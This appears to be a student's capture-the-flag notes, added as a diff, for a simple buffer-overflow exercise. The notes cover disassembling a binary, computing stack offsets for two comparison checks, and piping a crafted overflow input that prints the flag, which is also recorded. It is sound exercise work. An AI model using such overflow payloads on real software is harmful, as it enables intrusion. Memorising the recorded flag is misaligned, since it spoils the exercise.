@@ -1,0 +1,20 @@
+$ cd "/c/Users/Andre/Documents/2026_01_29/buffer"
+$ chmod +x buffer
+$ strings buffer
+Wrong input in func1
+func1
+$ objdump -d buffer	dobbiamo far eseguire print flag
+buffer vulnerabile
+cmpl $0x41424344,-0xc(%rbp)
+0x41424344=44 43 42 41=D C B A
+cmpl $0x61626364,-0x8(%rbp)
+0x61626364=64 63 62 61=d c b a
+
+buffer:        -0x16=16+6=22
+|	|10 byte
+|	check1:        -0xc=12
+|14 byte
+check2:        -0x8=8
+
+$ python3 -c "print('A'*10 + 'DCBA' + 'dcba')" | ./buffer
+spritz{466db21eX76aaX4ff9Xa3aaXcd40eb71f09b}
